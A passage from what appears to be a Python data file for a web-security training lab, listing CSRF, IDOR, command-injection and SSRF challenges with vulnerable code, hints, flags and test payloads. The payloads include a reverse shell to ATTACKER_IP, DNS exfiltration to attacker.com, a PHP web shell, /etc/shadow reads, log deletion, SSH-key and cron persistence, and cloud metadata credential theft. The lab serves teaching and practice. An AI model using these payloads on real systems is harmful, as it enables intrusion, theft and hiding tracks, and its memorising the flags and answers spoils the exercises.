        'hint1': 'Referrer-Policy header can control what\'s sent.',
        'hint2': 'Set Referrer-Policy: no-referrer on attacker site.',
        'hint3': 'Request won\'t include Referer, bypassing check.',
        'flag': 'FLAG{csrf_referrer_bypass_053}',
        'testPayload': 'Request with no referer'
    },
    {
        'id': 54,
        'title': 'CSRF - WebSocket CSRF',
        'category': 'csrf',
        'difficulty': 3,
        'points': 100,
        'description': 'CSRF on WebSocket connection.',
        'scenario': 'WebSocket endpoint without CSRF token.',
        'vulnerableCode': 'ws://target/socket accepts unvalidated messages',
        'hint1': 'WebSockets send cookies automatically.',
        'hint2': 'Can establish connection and send malicious message.',
        'hint3': 'Payload: var ws = new WebSocket("ws://target/socket"); ws.send("malicious_message")',
        'flag': 'FLAG{csrf_websocket_054}',
        'testPayload': 'WebSocket CSRF'
    },
    {
        'id': 55,
        'title': 'CSRF - Flash-Based CSRF',
        'category': 'csrf',
        'difficulty': 2,
        'points': 75,
        'description': 'CSRF attack using Flash.',
        'scenario': 'Flash file makes cross-origin requests.',
        'vulnerableCode': 'Flash file loads from attacker server',
        'hint1': 'Flash can bypass same-origin policy.',
        'hint2': 'Flash crossdomain.xml controls access.',
        'hint3': 'Attacker creates malicious Flash file.',
        'flag': 'FLAG{csrf_flash_055}',
        'testPayload': 'Flash CSRF vector'
    },
    {
        'id': 56,
        'title': 'CSRF - Logout CSRF',
        'category': 'csrf',
        'difficulty': 1,
        'points': 50,
        'description': 'CSRF to force logout.',
        'scenario': 'Logout endpoint doesn\'t require CSRF token.',
        'vulnerableCode': '@app.route("/logout", methods=["GET"])',
        'hint1': 'Force logout can be used to user detriment.',
        'hint2': 'Victim gets logged out unknowingly.',
        'hint3': 'Payload: <img src="http://target/logout">',
        'flag': 'FLAG{csrf_logout_056}',
        'testPayload': '<img src="http://target/logout">'
    },
    {
        'id': 57,
        'title': 'CSRF - Browser Plugin CSRF',
        'category': 'csrf',
        'difficulty': 2,
        'points': 75,
        'description': 'CSRF via browser plugin.',
        'scenario': 'Malicious plugin makes requests.',
        'vulnerableCode': 'Plugin code executes in browser context',
        'hint1': 'Plugins can bypass same-origin policy.',
        'hint2': 'Plugin makes authenticated requests.',
        'hint3': 'Attacker distributes malicious plugin.',
        'flag': 'FLAG{csrf_browser_plugin_057}',
        'testPayload': 'Plugin-based CSRF'
    },
    {
        'id': 58,
        'title': 'CSRF - DNS Rebinding',
        'category': 'csrf',
        'difficulty': 3,
        'points': 100,
        'description': 'CSRF via DNS rebinding attack.',
        'scenario': 'Attacker controls DNS for their domain.',
        'vulnerableCode': 'Browser trusts initial DNS resolution',
        'hint1': 'DNS rebinding changes IP after initial request.',
        'hint2': 'Second request goes to different server.',
        'hint3': 'Attacker makes request appear to be same-origin.',
        'flag': 'FLAG{csrf_dns_rebinding_058}',
        'testPayload': 'DNS rebinding attack'
    },
    {
        'id': 59,
        'title': 'CSRF - Null Origin',
        'category': 'csrf',
        'difficulty': 2,
        'points': 75,
        'description': 'Bypass same-origin policy using null origin.',
        'scenario': 'CORS allows requests from null origin.',
        'vulnerableCode': 'Access-Control-Allow-Origin: null',
        'hint1': 'Some responses set CORS to allow null origin.',
        'hint2': 'Sandbox iframe, data: URI have null origin.',
        'hint3': 'Payload: Sandboxed iframe makes request.',
        'flag': 'FLAG{csrf_null_origin_059}',
        'testPayload': 'Null origin CSRF'
    },
    {
        'id': 60,
        'title': 'CSRF - Double Submit Bypass',
        'category': 'csrf',
        'difficulty': 2,
        'points': 75,
        'description': 'Bypass double-submit cookie protection.',
        'scenario': 'Token value can be predicted or fixed.',
        'vulnerableCode': 'CSRF token is fixed value per session',
        'hint1': 'If token doesn\'t change, can be guessed.',
        'hint2': 'If generation is predictable, can be forged.',
        'hint3': 'Payload: Set both cookie and token to same value.',
        'flag': 'FLAG{csrf_double_submit_bypass_060}',
        'testPayload': 'Predictable CSRF token'
    },

    # ==================== IDOR - Insecure Direct Object Reference (Labs 61-80) ====================
    {
        'id': 61,
        'title': 'IDOR - Numeric ID Enumeration',
        'category': 'idor',
        'difficulty': 1,
        'points': 50,
        'description': 'Access other users profiles via numeric ID.',
        'scenario': '/api/user/1, /api/user/2, /api/user/3 - no authorization check.',
        'vulnerableCode': 'GET /api/user/{id} returns user data without checking permission',
        'hint1': 'Try changing the ID number in the URL.',
        'hint2': 'Increment or decrement to find other users.',
        'hint3': 'Payload: Change ID from 1 to 2, 3, 4... to see others.',
        'flag': 'FLAG{idor_numeric_enum_061}',
        'testPayload': '/api/user/2'
    },
    {
        'id': 62,
        'title': 'IDOR - Sequential ID Prediction',
        'category': 'idor',
        'difficulty': 1,
        'points': 50,
        'description': 'Predict sequential IDs of other resources.',
        'scenario': 'Invoice IDs are sequential: INV-001, INV-002, INV-003.',
        'vulnerableCode': 'GET /invoices/{invoice_id} returns invoice data',
        'hint1': 'Sequential IDs are easy to predict.',
        'hint2': 'If you have INV-001, try INV-002, INV-003.',
        'hint3': 'Payload: Request INV-001, then INV-002, etc.',
        'flag': 'FLAG{idor_sequential_062}',
        'testPayload': '/invoices/INV-002'
    },
    {
        'id': 63,
        'title': 'IDOR - UUID Enumeration',
        'category': 'idor',
        'difficulty': 2,
        'points': 75,
        'description': 'Brute force UUIDs if generation is weak.',
        'scenario': 'Weak UUID generation with patterns.',
        'vulnerableCode': 'GET /resource/{uuid} without authorization',
        'hint1': 'UUIDs should be cryptographically random.',
        'hint2': 'Weak UUIDs may have patterns.',
        'hint3': 'Payload: Try sequential or time-based UUIDs.',
        'flag': 'FLAG{idor_uuid_enum_063}',
        'testPayload': '/resource/aaaaaaaa-aaaa-aaaa-aaaa-aaaaaaaaaaaa'
    },
    {
        'id': 64,
        'title': 'IDOR - Horizontal Privilege Escalation',
        'category': 'idor',
        'difficulty': 1,
        'points': 50,
        'description': 'Access same privilege level user resources.',
        'scenario': 'User A accesses User B profile.',
        'vulnerableCode': 'GET /profile/{user_id} - no check if current_user == user_id',
        'hint1': 'Horizontal escalation: access peers resources.',
        'hint2': 'All users have same privilege, access each others data.',
        'hint3': 'Payload: Access another users profile.',
        'flag': 'FLAG{idor_horizontal_priv_064}',
        'testPayload': '/profile/999'
    },
    {
        'id': 65,
        'title': 'IDOR - Vertical Privilege Escalation',
        'category': 'idor',
        'difficulty': 1,
        'points': 50,
        'description': 'Access admin resources as regular user.',
        'scenario': 'Admin ID is 1, regular users start from 2.',
        'vulnerableCode': 'GET /admin/users/{user_id} returns data without admin check',
        'hint1': 'Admin users often have lower IDs.',
        'hint2': 'Try ID 1, 0, or negative numbers.',
        'hint3': 'Payload: Access /admin/users/1 as regular user.',
        'flag': 'FLAG{idor_vertical_priv_065}',
        'testPayload': '/admin/users/1'
    },
    {
        'id': 66,
        'title': 'IDOR - Parameter Manipulation',
        'category': 'idor',
        'difficulty': 1,
        'points': 50,
        'description': 'Manipulate query parameters to access others data.',
        'scenario': 'URL: /account?user_id=123&type=profile.',
        'vulnerableCode': 'Direct use of user_id parameter without validation',
        'hint1': 'Change user_id parameter to other values.',
        'hint2': 'Try user_id=1, 2, 3, etc.',
        'hint3': 'Payload: /account?user_id=999',
        'flag': 'FLAG{idor_param_manipulation_066}',
        'testPayload': '/account?user_id=999'
    },
    {
        'id': 67,
        'title': 'IDOR - Base64 ID Decoding',
        'category': 'idor',
        'difficulty': 2,
        'points': 75,
        'description': 'Decode base64 ID and modify.',
        'scenario': 'ID is base64 encoded but unencrypted.',
        'vulnerableCode': 'id = base64_decode(request.args.get("id"))',
        'hint1': 'Base64 is encoding, not encryption.',
        'hint2': 'Decode, modify, re-encode.',
        'hint3': 'Payload: Decode base64 ID, change number, encode back.',
        'flag': 'FLAG{idor_base64_decode_067}',
        'testPayload': 'dXNlcl8yOTk='
    },
    {
        'id': 68,
        'title': 'IDOR - API Endpoint Enumeration',
        'category': 'idor',
        'difficulty': 1,
        'points': 50,
        'description': 'Access different API versions with weak IDOR.',
        'scenario': '/api/v1/user/1 vs /api/v2/user/1 - v1 missing auth check.',
        'vulnerableCode': 'API v1 lacks authorization, v2 has it',
        'hint1': 'Different API versions may have different security.',
        'hint2': 'Try /api/v1/, /api/v2/, /api/v3/.',
        'hint3': 'Payload: Access /api/v1/users/999',
        'flag': 'FLAG{idor_api_enum_068}',
        'testPayload': '/api/v1/users/999'
    },
    {
        'id': 69,
        'title': 'IDOR - JSON Property Manipulation',
        'category': 'idor',
        'difficulty': 2,
        'points': 75,
        'description': 'Modify JSON properties to access others data.',
        'scenario': 'POST request with user_id in JSON body.',
        'vulnerableCode': 'request.json.get("user_id") used without validation',
        'hint1': 'Change user_id in JSON request body.',
        'hint2': 'Server processes without checking permission.',
        'hint3': 'Payload: {"user_id": 999, "action": "view"}',
        'flag': 'FLAG{idor_json_property_069}',
        'testPayload': '{"user_id": 999}'
    },
    {
        'id': 70,
        'title': 'IDOR - Cookie-Based ID',
        'category': 'idor',
        'difficulty': 1,
        'points': 50,
        'description': 'Modify cookie containing user ID.',
        'scenario': 'Cookie: user_id=123; application trusts it.',
        'vulnerableCode': 'user_id = request.cookies.get("user_id")',
        'hint1': 'Cookies are client-side, can be modified.',
        'hint2': 'Change user_id cookie value.',
        'hint3': 'Payload: Set cookie user_id=999',
        'flag': 'FLAG{idor_cookie_based_070}',
        'testPayload': 'user_id=999'
    },
    {
        'id': 71,
        'title': 'IDOR - Timestamp-Based ID',
        'category': 'idor',
        'difficulty': 2,
        'points': 75,
        'description': 'Guess timestamp-based IDs.',
        'scenario': 'Resource ID based on creation timestamp.',
        'vulnerableCode': 'id = int(time.time())',
        'hint1': 'If ID is timestamp, can predict nearby timestamps.',
        'hint2': 'Guess IDs created around same time.',
        'hint3': 'Payload: Try timestamps 1 second before/after.',
        'flag': 'FLAG{idor_timestamp_071}',
        'testPayload': '1234567890'
    },
    {
        'id': 72,
        'title': 'IDOR - File Path Traversal via ID',
        'category': 'idor',
        'difficulty': 2,
        'points': 75,
        'description': 'Use IDOR for file path traversal.',
        'scenario': '/download?file_id=../../../etc/passwd.',
        'vulnerableCode': 'file = get_file_by_id(file_id) without validation',
        'hint1': 'IDOR can be combined with path traversal.',
        'hint2': 'Try file_id=../../../etc/passwd.',
        'hint3': 'Payload: file_id=../../../sensitive_file',
        'flag': 'FLAG{idor_file_traversal_072}',
        'testPayload': 'file_id=../../../etc/passwd'
    },
    {
        'id': 73,
        'title': 'IDOR - Email-Based ID Guessing',
        'category': 'idor',
        'difficulty': 1,
        'points': 50,
        'description': 'Guess email addresses for IDOR.',
        'scenario': 'API: /user/email?email=admin@company.com.',
        'vulnerableCode': 'user = find_user_by_email(email)',
        'hint1': 'Email addresses are often guessable.',
        'hint2': 'Try common patterns: admin@, first.last@.',
        'hint3': 'Payload: email=admin@company.com',
        'flag': 'FLAG{idor_email_guessing_073}',
        'testPayload': 'email=admin@company.com'
    },
    {
        'id': 74,
        'title': 'IDOR - Wildcard Parameter',
        'category': 'idor',
        'difficulty': 1,
        'points': 50,
        'description': 'Use wildcard to access all resources.',
        'scenario': '/api/resource/*/details returns all details.',
        'vulnerableCode': 'Wildcard in route returns unfiltered results',
        'hint1': 'Try wildcard characters in ID field.',
        'hint2': 'Try *, %, _, ?, *.*.',
        'hint3': 'Payload: /api/resource/*',
        'flag': 'FLAG{idor_wildcard_074}',
        'testPayload': '/api/resource/*'
    },
    {
        'id': 75,
        'title': 'IDOR - Null/Empty ID',
        'category': 'idor',
        'difficulty': 1,
        'points': 50,
        'description': 'Access default resource using null ID.',
        'scenario': '/profile with no ID returns admin profile.',
        'vulnerableCode': 'if not id: return admin_profile',
        'hint1': 'Try empty ID, null, or missing parameter.',
        'hint2': 'May return default or admin resource.',
        'hint3': 'Payload: /profile or /profile/null or /profile/',
        'flag': 'FLAG{idor_null_empty_075}',
        'testPayload': '/profile/'
    },
    {
        'id': 76,
        'title': 'IDOR - Negative ID Values',
        'category': 'idor',
        'difficulty': 1,
        'points': 50,
        'description': 'Use negative ID to bypass checks.',
        'scenario': 'ID validation checks positive only.',
        'vulnerableCode': 'if id > 0: access_denied; but -1 passes',
        'hint1': 'Try negative numbers: -1, -999.',
        'hint2': 'Validation may miss negative values.',
        'hint3': 'Payload: /user/-1',
        'flag': 'FLAG{idor_negative_id_076}',
        'testPayload': '/user/-1'
    },
    {
        'id': 77,
        'title': 'IDOR - Type Confusion',
        'category': 'idor',
        'difficulty': 2,
        'points': 75,
        'description': 'Bypass ID checks via type confusion.',
        'scenario': 'ID expected as int, but accepts string.',
        'vulnerableCode': 'id = request.args.get("id"); if id == 1: allow',
        'hint1': 'Type confusion: "1" != 1 in some languages.',
        'hint2': 'Try string vs int: "1" vs 1.',
        'hint3': 'Payload: id="1" or id=1.0',
        'flag': 'FLAG{idor_type_confusion_077}',
        'testPayload': 'id="1"'
    },
    {
        'id': 78,
        'title': 'IDOR - Encoded ID Format',
        'category': 'idor',
        'difficulty': 2,
        'points': 75,
        'description': 'Bypass by changing ID encoding.',
        'scenario': 'Hex ID: 0x1 vs decimal 1.',
        'vulnerableCode': 'ID validation doesn\'t account for encoding',
        'hint1': 'Try hex (0x), octal (0), scientific notation.',
        'hint2': 'Different encodings same value.',
        'hint3': 'Payload: /user/0x1 or /user/01',
        'flag': 'FLAG{idor_encoded_format_078}',
        'testPayload': '/user/0x1'
    },
    {
        'id': 79,
        'title': 'IDOR - Batch Processing',
        'category': 'idor',
        'difficulty': 2,
        'points': 75,
        'description': 'IDOR in batch operation endpoint.',
        'scenario': '/batch?ids=1,2,3,4,5 returns multiple resources.',
        'vulnerableCode': 'Process multiple IDs without per-ID auth check',
        'hint1': 'Batch endpoints may miss individual authorization.',
        'hint2': 'Try accessing multiple user IDs at once.',
        'hint3': 'Payload: /batch?ids=1,2,3,999,1000',
        'flag': 'FLAG{idor_batch_processing_079}',
        'testPayload': '/batch?ids=1,2,3,999'
    },
    {
        'id': 80,
        'title': 'IDOR - Response Data Mining',
        'category': 'idor',
        'difficulty': 2,
        'points': 75,
        'description': 'Extract additional data from IDOR responses.',
        'scenario': 'Response includes hidden fields or references.',
        'vulnerableCode': 'JSON response includes all user data',
        'hint1': 'IDOR response may contain other user IDs.',
        'hint2': 'Extract and enumerate further.',
        'hint3': 'Payload: Request user/1, get IDs 2-100 in response.',
        'flag': 'FLAG{idor_response_mining_080}',
        'testPayload': '/user/1'
    },

    # ==================== RCE - Remote Code Execution (Labs 81-100) ====================
    {
        'id': 81,
        'title': 'RCE - Basic Command Injection',
        'category': 'rce',
        'difficulty': 1,
        'points': 75,
        'description': 'Execute system command via input.',
        'scenario': 'Image processing: convert {filename} output.jpg',
        'vulnerableCode': 'subprocess.run(f"convert {filename} output.jpg", shell=True)',
        'hint1': 'Use command separator: ; to chain commands.',
        'hint2': 'Try: image.jpg; whoami',
        'hint3': 'Payload: image.jpg; id',
        'flag': 'FLAG{rce_basic_command_081}',
        'testPayload': 'image.jpg; id'
    },
    {
        'id': 82,
        'title': 'RCE - Command Chaining with &&',
        'category': 'rce',
        'difficulty': 1,
        'points': 75,
        'description': 'Chain commands with && operator.',
        'scenario': 'Ping utility: ping -c 1 {host}.',
        'vulnerableCode': 'os.system(f"ping -c 1 {host}")',
        'hint1': '&& executes second command if first succeeds.',
        'hint2': 'Try: google.com && cat /etc/passwd',
        'hint3': 'Payload: localhost && whoami',
        'flag': 'FLAG{rce_cmd_chaining_082}',
        'testPayload': 'localhost && whoami'
    },
    {
        'id': 83,
        'title': 'RCE - Command Substitution with $()',
        'category': 'rce',
        'difficulty': 1,
        'points': 75,
        'description': 'Use $() for command substitution.',
        'scenario': 'Filename processing with substitution.',
        'vulnerableCode': 'system("ls $(user_input)")',
        'hint1': '$() substitutes command output in place.',
        'hint2': 'Try: $(whoami)',
        'hint3': 'Payload: $(cat /etc/passwd)',
        'flag': 'FLAG{rce_cmd_substitution_083}',
        'testPayload': '$(whoami)'
    },
    {
        'id': 84,
        'title': 'RCE - Backtick Command Substitution',
        'category': 'rce',
        'difficulty': 1,
        'points': 75,
        'description': 'Use backticks for command substitution.',
        'scenario': 'Legacy shell script with backticks.',
        'vulnerableCode': 'echo `user_input`',
        'hint1': 'Backticks `` also substitute commands.',
        'hint2': 'Try: `whoami`',
        'hint3': 'Payload: `id`',
        'flag': 'FLAG{rce_backtick_substitution_084}',
        'testPayload': '`id`'
    },
    {
        'id': 85,
        'title': 'RCE - Pipe to Command',
        'category': 'rce',
        'difficulty': 1,
        'points': 75,
        'description': 'Pipe output to another command.',
        'scenario': 'Search functionality piped to shell.',
        'vulnerableCode': 'os.system(f"grep {term} file.txt")',
        'hint1': 'Pipe | passes output to next command.',
        'hint2': 'Try: test | whoami',
        'hint3': 'Payload: a | cat /etc/passwd',
        'flag': 'FLAG{rce_pipe_command_085}',
        'testPayload': 'a | cat /etc/passwd'
    },
    {
        'id': 86,
        'title': 'RCE - Or Operator ||',
        'category': 'rce',
        'difficulty': 1,
        'points': 75,
        'description': 'Use || to execute second command on failure.',
        'scenario': 'Command that fails triggers injection.',
        'vulnerableCode': 'system("command || user_input")',
        'hint1': '|| executes second command if first fails.',
        'hint2': 'Try: false || whoami',
        'hint3': 'Payload: invalid || id',
        'flag': 'FLAG{rce_or_operator_086}',
        'testPayload': 'false || id'
    },
    {
        'id': 87,
        'title': 'RCE - Reverse Shell Payload',
        'category': 'rce',
        'difficulty': 2,
        'points': 100,
        'description': 'Execute reverse shell to attacker.',
        'scenario': 'RCE leads to reverse connection.',
        'vulnerableCode': 'Vulnerable to command injection',
        'hint1': 'Use nc, bash, or python for reverse shell.',
        'hint2': 'Connect back to attacker IP and port.',
        'hint3': 'Payload: bash -i >& /dev/tcp/ATTACKER_IP/PORT 0>&1',
        'flag': 'FLAG{rce_reverse_shell_087}',
        'testPayload': 'bash -i >& /dev/tcp/127.0.0.1/4444 0>&1'
    },
    {
        'id': 88,
        'title': 'RCE - Read Sensitive Files',
        'category': 'rce',
        'difficulty': 1,
        'points': 75,
        'description': 'Read sensitive files via RCE.',
        'scenario': 'Read /etc/passwd, /etc/shadow, configs.',
        'vulnerableCode': 'Command injection allows file read',
        'hint1': 'Use cat, head, tail to read files.',
        'hint2': 'Try: cat /etc/passwd',
        'hint3': 'Payload: ; cat /etc/shadow',
        'flag': 'FLAG{rce_read_files_088}',
        'testPayload': '; cat /etc/passwd'
    },
    {
        'id': 89,
        'title': 'RCE - Write to File System',
        'category': 'rce',
        'difficulty': 2,
        'points': 100,
        'description': 'Write files to server via RCE.',
        'scenario': 'Create web shell or malicious file.',
        'vulnerableCode': 'Command injection allows file write',
        'hint1': 'Use echo or printf to write files.',
        'hint2': 'Try: echo "<?php system($_GET[\'cmd\']); ?>" > shell.php',
        'hint3': 'Payload: ; echo "malicious" > /tmp/pwned.txt',
        'flag': 'FLAG{rce_write_file_089}',
        'testPayload': '; echo "test" > /tmp/test.txt'
    },
    {
        'id': 90,
        'title': 'RCE - Process Enumeration',
        'category': 'rce',
        'difficulty': 1,
        'points': 75,
        'description': 'List running processes for reconnaissance.',
        'scenario': 'Determine what software is running.',
        'vulnerableCode': 'Command injection allows ps command',
        'hint1': 'Use ps, ps aux, or top to list processes.',
        'hint2': 'Try: ps aux',
        'hint3': 'Payload: ; ps aux',
        'flag': 'FLAG{rce_process_enum_090}',
        'testPayload': '; ps aux'
    },
    {
        'id': 91,
        'title': 'RCE - Network Reconnaissance',
        'category': 'rce',
        'difficulty': 1,
        'points': 75,
        'description': 'Probe network from compromised server.',
        'scenario': 'Use nmap, netstat to map network.',
        'vulnerableCode': 'Command injection allows network commands',
        'hint1': 'Use netstat, ss, nmap, traceroute.',
        'hint2': 'Try: netstat -an',
        'hint3': 'Payload: ; netstat -an',
        'flag': 'FLAG{rce_network_recon_091}',
        'testPayload': '; netstat -an'
    },
    {
        'id': 92,
        'title': 'RCE - Environment Variable Leakage',
        'category': 'rce',
        'difficulty': 1,
        'points': 75,
        'description': 'Extract environment variables.',
        'scenario': 'Get API keys, credentials from env vars.',
        'vulnerableCode': 'Command injection allows env command',
        'hint1': 'Use env or printenv to list variables.',
        'hint2': 'Try: env or set',
        'hint3': 'Payload: ; env',
        'flag': 'FLAG{rce_env_vars_092}',
        'testPayload': '; env'
    },
    {
        'id': 93,
        'title': 'RCE - Database Credentials Extraction',
        'category': 'rce',
        'difficulty': 1,
        'points': 75,
        'description': 'Extract database credentials from config.',
        'scenario': 'Find and read config files.',
        'vulnerableCode': 'Command injection allows file read',
        'hint1': 'Look for config files: .env, config.php, db.yml.',
        'hint2': 'Try: cat config/database.yml',
        'hint3': 'Payload: ; find . -name "*.yml"',
        'flag': 'FLAG{rce_db_creds_093}',
        'testPayload': '; find . -name "*.yml"'
    },
    {
        'id': 94,
        'title': 'RCE - Privilege Escalation',
        'category': 'rce',
        'difficulty': 2,
        'points': 100,
        'description': 'Escalate from web server to root.',
        'scenario': 'Find and exploit SUID binaries.',
        'vulnerableCode': 'RCE as www-user, escalate to root',
        'hint1': 'Look for SUID binaries: find / -perm -4000.',
        'hint2': 'Check for sudo without password.',
        'hint3': 'Payload: find / -perm -4000 2>/dev/null',
        'flag': 'FLAG{rce_priv_escalation_094}',
        'testPayload': 'find / -perm -4000 2>/dev/null'
    },
    {
        'id': 95,
        'title': 'RCE - Time Delay for Verification',
        'category': 'rce',
        'difficulty': 1,
        'points': 75,
        'description': 'Use sleep to verify blind RCE.',
        'scenario': 'No output but can detect via timing.',
        'vulnerableCode': 'Blind RCE, no output shown',
        'hint1': 'Use sleep to cause delay.',
        'hint2': 'If delay occurs, command executed.',
        'hint3': 'Payload: ; sleep 5',
        'flag': 'FLAG{rce_time_delay_095}',
        'testPayload': '; sleep 5'
    },
    {
        'id': 96,
        'title': 'RCE - DNS Exfiltration',
        'category': 'rce',
        'difficulty': 2,
        'points': 100,
        'description': 'Exfiltrate data via DNS queries.',
        'scenario': 'Send data through DNS to attacker server.',
        'vulnerableCode': 'RCE allows nslookup/dig commands',
        'hint1': 'Use nslookup to query custom DNS server.',
        'hint2': 'Encode data in subdomain: data.attacker.com.',
        'hint3': 'Payload: nslookup $(whoami).attacker.com 8.8.8.8',
        'flag': 'FLAG{rce_dns_exfil_096}',
        'testPayload': 'nslookup test.attacker.com'
    },
    {
        'id': 97,
        'title': 'RCE - Log Manipulation',
        'category': 'rce',
        'difficulty': 1,
        'points': 75,
        'description': 'Modify or delete logs to hide tracks.',
        'scenario': 'Remove evidence of attack from logs.',
        'vulnerableCode': 'Command injection allows file modification',
        'hint1': 'Use rm to delete logs.',
        'hint2': 'Try: rm /var/log/apache2/access.log',
        'hint3': 'Payload: ; rm -f /var/log/*',
        'flag': 'FLAG{rce_log_manipulation_097}',
        'testPayload': '; rm -f /tmp/test'
    },
    {
        'id': 98,
        'title': 'RCE - SSH Key Injection',
        'category': 'rce',
        'difficulty': 2,
        'points': 100,
        'description': 'Add SSH key for persistent access.',
        'scenario': 'Add attacker public key to authorized_keys.',
        'vulnerableCode': 'Command injection allows file write',
        'hint1': 'Create .ssh directory and authorized_keys.',
        'hint2': 'Write attacker SSH public key.',
        'hint3': 'Payload: mkdir -p ~/.ssh; echo "PUBLIC_KEY" >> ~/.ssh/authorized_keys',
        'flag': 'FLAG{rce_ssh_injection_098}',
        'testPayload': 'mkdir -p ~/.ssh'
    },
    {
        'id': 99,
        'title': 'RCE - Package Manager Exploitation',
        'category': 'rce',
        'difficulty': 2,
        'points': 100,
        'description': 'Abuse package manager for code execution.',
        'scenario': 'Install malicious packages via apt/pip/npm.',
        'vulnerableCode': 'RCE allows package installation',
        'hint1': 'Use apt, pip, npm to install packages.',
        'hint2': 'Try: apt-get install malicious-package',
        'hint3': 'Payload: pip install attacker-package',
        'flag': 'FLAG{rce_package_manager_099}',
        'testPayload': 'pip list'
    },
    {
        'id': 100,
        'title': 'RCE - Cron Job Manipulation',
        'category': 'rce',
        'difficulty': 2,
        'points': 100,
        'description': 'Create cron job for persistence.',
        'scenario': 'Schedule malicious script to run periodically.',
        'vulnerableCode': 'Command injection allows cron modification',
        'hint1': 'Edit crontab to add malicious job.',
        'hint2': 'Try: echo "* * * * * /bin/bash -c \'...\'" | crontab -',
        'hint3': 'Payload: crontab -l (list current jobs)',
        'flag': 'FLAG{rce_cron_manipulation_100}',
        'testPayload': 'crontab -l'
    },

    # ==================== SSRF (Server-Side Request Forgery) Labs 101-120 ====================
    {
        'id': 101,
        'title': 'SSRF - Basic Internal Service Access',
        'category': 'ssrf',
        'difficulty': 1,
        'points': 50,
        'description': 'Access internal service via SSRF.',
        'scenario': 'URL fetcher vulnerable to SSRF. Try accessing localhost.',
        'vulnerableCode': 'url_content = requests.get(user_url).text',
        'hint1': 'Try accessing localhost instead of external URLs.',
        'hint2': 'The service might be listening on 127.0.0.1',
        'hint3': 'Payload: http://127.0.0.1:8080',
        'flag': 'FLAG{ssrf_internal_101}',
        'testPayload': 'http://127.0.0.1:8080'
    },
    {
        'id': 102,
        'title': 'SSRF - Admin Panel Access',
        'category': 'ssrf',
        'difficulty': 1,
        'points': 60,
        'description': 'Access restricted admin panel through SSRF.',
        'scenario': 'Admin portal only accessible from localhost.',
        'vulnerableCode': 'fetch(user_provided_url)',
        'hint1': 'Admin panel might be on localhost only.',
        'hint2': 'Try different ports (8000, 5000, 3000).',
        'hint3': 'Payload: http://localhost:8000/admin',
        'flag': 'FLAG{ssrf_admin_panel_102}',
        'testPayload': 'http://localhost:8000/admin'
    },
    {
        'id': 103,
        'title': 'SSRF - Internal Database Connection',
        'category': 'ssrf',
        'difficulty': 2,
        'points': 75,
        'description': 'Connect to internal database through SSRF.',
        'scenario': 'Database accessible only from internal network.',
        'vulnerableCode': 'response = urllib.request.urlopen(url)',
        'hint1': 'Database ports like 5432, 3306 might be open internally.',
        'hint2': 'Try common database ports.',
        'hint3': 'Payload: http://127.0.0.1:5432',
        'flag': 'FLAG{ssrf_database_103}',
        'testPayload': 'http://127.0.0.1:5432'
    },
    {
        'id': 104,
        'title': 'SSRF - Localhost Service Scanning',
        'category': 'ssrf',
        'difficulty': 2,
        'points': 75,
        'description': 'Scan internal network for running services.',
        'scenario': 'Finding hidden services via port enumeration.',
        'vulnerableCode': 'requests.get(constructed_internal_url)',
        'hint1': 'Scan common ports to find running services.',
        'hint2': 'Check ports 80, 443, 8080, 8000, 3000, 5000.',
        'hint3': 'Response times differ between open/closed ports.',
        'flag': 'FLAG{ssrf_port_scan_104}',
        'testPayload': 'http://127.0.0.1:22'
    },
    {
        'id': 105,
        'title': 'SSRF - File Protocol Access',
        'category': 'ssrf',
        'difficulty': 2,
        'points': 75,
        'description': 'Read local files using file:// protocol.',
        'scenario': 'URL handler supports multiple protocols.',
        'vulnerableCode': 'content = urlopen(user_url).read()',
        'hint1': 'Some applications support file:// protocol.',
        'hint2': 'Try accessing /etc/passwd',
        'hint3': 'Payload: file:///etc/passwd',
        'flag': 'FLAG{ssrf_file_protocol_105}',
        'testPayload': 'file:///etc/passwd'
    },
    {
        'id': 106,
        'title': 'SSRF - AWS Metadata Service',
        'category': 'ssrf',
        'difficulty': 2,
        'points': 80,
        'description': 'Extract AWS credentials from metadata service.',
        'scenario': 'Application running on EC2 instance.',
        'vulnerableCode': 'response = requests.get(metadata_url)',
        'hint1': 'AWS metadata available at 169.254.169.254',
        'hint2': 'Try accessing instance metadata.',
        'hint3': 'Payload: http://169.254.169.254/latest/meta-data/',
        'flag': 'FLAG{ssrf_aws_metadata_106}',
        'testPayload': 'http://169.254.169.254/latest/meta-data/'
    },
    {
        'id': 107,
        'title': 'SSRF - URL Scheme Bypass',
        'category': 'ssrf',
        'difficulty': 2,
        'points': 80,
        'description': 'Bypass URL scheme validation.',
        'scenario': 'Application checks for http/https but misses variations.',
        'vulnerableCode': 'if url.startswith(("http://", "https://")): fetch(url)',
        'hint1': 'Try alternative schemes like gopher, dict, tftp.',
        'hint2': 'Some schemes might be interpreted as http.',
        'hint3': 'Payload: gopher://internal-service:6379',
        'flag': 'FLAG{ssrf_scheme_bypass_107}',
        'testPayload': 'gopher://127.0.0.1:6379/_FLUSHALL'
    },
    {
        'id': 108,
        'title': 'SSRF - Docker Socket Access',
        'category': 'ssrf',
        'difficulty': 3,
        'points': 100,
        'description': 'Access Docker daemon socket through SSRF.',
        'scenario': 'Docker socket mounted as volume.',
        'vulnerableCode': 'requests.get(docker_socket_url)',
        'hint1': 'Docker socket usually at /var/run/docker.sock',
        'hint2': 'Accessible via http over Unix socket.',
        'hint3': 'Payload: http://127.0.0.1/var/run/docker.sock',
        'flag': 'FLAG{ssrf_docker_socket_108}',
        'testPayload': 'http://unix:///var/run/docker.sock/info'
    },
    {
        'id': 109,
        'title': 'SSRF - Redis Protocol Abuse',
        'category': 'ssrf',
        'difficulty': 3,
        'points': 100,
        'description': 'Interact with Redis server via SSRF.',
        'scenario': 'Redis running on internal network.',
        'vulnerableCode': 'response = send_request(internal_url)',
        'hint1': 'Redis protocol can be accessed via gopher://',
        'hint2': 'Use gopher to send raw Redis commands.',
        'hint3': 'Payload: gopher://127.0.0.1:6379/_KEYS%20*',
        'flag': 'FLAG{ssrf_redis_109}',
        'testPayload': 'gopher://127.0.0.1:6379/_KEYS%20*'
    },
    {
        'id': 110,
        'title': 'SSRF - LDAP Injection via URL',
        'category': 'ssrf',
        'difficulty': 3,
        'points': 100,
        'description': 'Perform LDAP injection through SSRF.',
        'scenario': 'LDAP service accessible internally.',
        'vulnerableCode': 'connect_ldap(user_url)',
        'hint1': 'LDAP URLs: ldap://host:389/cn=Users?*',
        'hint2': 'Wildcard (*) returns all attributes.',
        'hint3': 'Payload: ldap://127.0.0.1:389/cn=*',
        'flag': 'FLAG{ssrf_ldap_110}',
        'testPayload': 'ldap://127.0.0.1:389/cn=*'
    },
    {
        'id': 111,
